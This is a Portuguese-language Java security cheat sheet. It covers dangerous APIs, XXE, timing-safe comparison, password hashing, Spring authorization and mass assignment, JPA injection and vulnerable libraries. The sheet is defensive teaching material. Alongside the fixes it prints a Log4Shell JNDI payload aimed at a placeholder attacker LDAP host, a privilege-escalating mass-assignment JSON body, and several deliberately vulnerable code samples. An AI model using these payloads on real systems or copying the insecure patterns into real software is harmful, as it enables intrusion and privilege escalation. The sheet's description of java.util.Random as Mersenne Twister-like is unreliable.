# Java — Cartão de Segurança

## APIs perigosas

| API | Risco |
|---|---|
| `Runtime.exec(String)` | Command injection (preferir `ProcessBuilder` com lista) |
| `ObjectInputStream.readObject()` | Deserialization RCE |
| `XMLDecoder.readObject()` | RCE via XML |
| `Class.forName(userInput)` + `newInstance()` | RCE |
| `ScriptEngine.eval(code)` (Nashorn, JS engine) | RCE |
| `MessageFormat.format(pattern, args)` com pattern controlled | Format string |
| `String.format(pattern, args)` com pattern controlled | Format string / DoS |
| `Statement.executeQuery(sql)` com concatenação | SQLi |
| `JNDI lookup` (ex.: `ldap://`, `rmi://` URLs from input) | Log4Shell, RCE |
| `URL.openStream(userURL)` | SSRF |
| `File(userPath)` | Path traversal |
| `JarFile`/`ZipFile` sem size check | Zip bomb |
| `XPath.evaluate(userExpression, doc)` | XPath injection |

## Idiomas inseguros

### `String.equals` em hashes (timing)
```java
// BAD
if (expected.equals(received)) ...

// GOOD — constant time
if (MessageDigest.isEqual(expected.getBytes(StandardCharsets.UTF_8),
                          received.getBytes(StandardCharsets.UTF_8))) ...
```

### Parse de XML por default vulnerável a XXE
```java
// BAD
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(input);

// GOOD
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

### Random.nextInt para tokens
```java
// BAD
new Random().nextInt();   // Mersenne Twister-like, previsível

// GOOD
SecureRandom secureRandom = new SecureRandom();
byte[] bytes = new byte[32];
secureRandom.nextBytes(bytes);
String token = HexFormat.of().formatHex(bytes);
```

### Passwords com MessageDigest
```java
// BAD
MessageDigest md = MessageDigest.getInstance("SHA-256");
byte[] hash = md.digest(password.getBytes());

// GOOD — usar BCrypt/Argon2/PBKDF2
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);
String hash = encoder.encode(password);
boolean ok = encoder.matches(password, hash);
```

### Spring Security `permitAll()`
```java
// BAD — esquecido permitAll() em endpoint sensível
http.authorizeHttpRequests(authz -> authz
    .requestMatchers("/admin/**").permitAll()  // OOPS
    .anyRequest().authenticated()
);

// GOOD
http.authorizeHttpRequests(authz -> authz
    .requestMatchers("/admin/**").hasRole("ADMIN")
    .anyRequest().authenticated()
);
```

### Servlet sem CSRF check
- Spring Security ativa CSRF por default (depois v6 ainda mais explícito).
- Se desativado (`csrf.disable()`), confirmar que não há cookies de sessão.

### Log4Shell (CVE-2021-44228)
```java
// BAD — Log4j 2.0-2.16 com input não confiável em log
logger.info("User-Agent: " + request.getHeader("User-Agent"));
// UA = "${jndi:ldap://attacker/x}" → RCE

// GOOD — Log4j 2.17+ ou Logback
// Verifica versões em pom.xml/build.gradle
```

## Helpers seguros (stdlib + Spring/Apache)

| Necessidade | Use |
|---|---|
| Random | `SecureRandom` |
| Constant-time compare | `MessageDigest.isEqual(a, b)` |
| Password hashing | Spring Security `BCryptPasswordEncoder`, `Argon2PasswordEncoder` |
| HMAC | `Mac.getInstance("HmacSHA256")` |
| URL parsing | `java.net.URI` (preferir sobre `URL` para parse, validar scheme) |
| Path safety | `Paths.get(base).resolve(input).normalize()` + `startsWith(base)` check |
| HTML escape | `org.apache.commons.text.StringEscapeUtils.escapeHtml4` ou OWASP encoder |
| Shell escape | Lista no `ProcessBuilder` (não escape) |
| JWT | `jjwt`, `nimbus-jose-jwt`, `auth0/java-jwt` |
| HTTP client | `java.net.http.HttpClient` (Java 11+) |
| XML | `defusedxml-java` ou config manual de `DocumentBuilderFactory` |

## Pitfalls específicos

### Spring `@RequestMapping` sem method
```java
// BAD — aceita GET e POST
@RequestMapping("/admin/delete")
public void delete(...) { ... }

// GOOD
@PostMapping("/admin/delete")
@PreAuthorize("hasRole('ADMIN')")
public void delete(...) { ... }
```

### Spring data binding (mass assignment)
```java
// BAD
@PostMapping("/profile")
public User update(@RequestBody User user) { return repo.save(user); }
// Atacante: { "id": 1, "role": "ADMIN" } → privilege escalation

// GOOD — DTO específico
@PostMapping("/profile")
public User update(@RequestBody UpdateProfileDto dto) {
    User user = repo.findById(currentUserId()).orElseThrow();
    user.setName(dto.getName());
    user.setBio(dto.getBio());
    return repo.save(user);
}
```

### JPA `nativeQuery=true` com concatenação
```java
// BAD
@Query(value = "SELECT * FROM users WHERE name = '" + ":name" + "'", nativeQuery = true)

// GOOD
@Query(value = "SELECT * FROM users WHERE name = :name", nativeQuery = true)
List<User> findByName(@Param("name") String name);
```

### Java Beans Validation (JSR 380)
- `@NotNull`, `@Size`, `@Pattern`, `@Email` — usar para validar DTOs.
- Sem isto, mass assignment / overflows passam.

## Bibliotecas comuns com vulns

- **Log4j < 2.17** → Log4Shell
- **Spring4Shell** → Spring < 5.3.18
- **Jackson** → várias CVEs deserialization (manter atualizado, default typing OFF)
- **Tomcat** → manter LTS atualizado
- **Hibernate** → atualizar
- **Apache Commons Collections** → gadget chain para deserialization (não usar com `ObjectInputStream`)
- **XStream** — vulnerável por default a deserialization

## Quick wins

- [ ] Java 17+ LTS (Java 8/11 ainda comuns mas desatualizar com plano)
- [ ] Spring Boot 3.x (Spring Security 6.x)
- [ ] `mvn dependency-check:check` (OWASP) sem Críticos
- [ ] `BCryptPasswordEncoder` (cost ≥ 12) para passwords
- [ ] `SecureRandom` para tokens
- [ ] `MessageDigest.isEqual` para comparações
- [ ] DOM/SAX/StAX configurados sem entidades externas
- [ ] DTOs por endpoint (sem expor entidade JPA inteira)
- [ ] Bean Validation em todos os DTOs
- [ ] `@PreAuthorize`/`@RolesAllowed` em todos os endpoints sensíveis
- [ ] CSRF ativo (default em Spring Security)
- [ ] Logback (não Log4j 1.x)
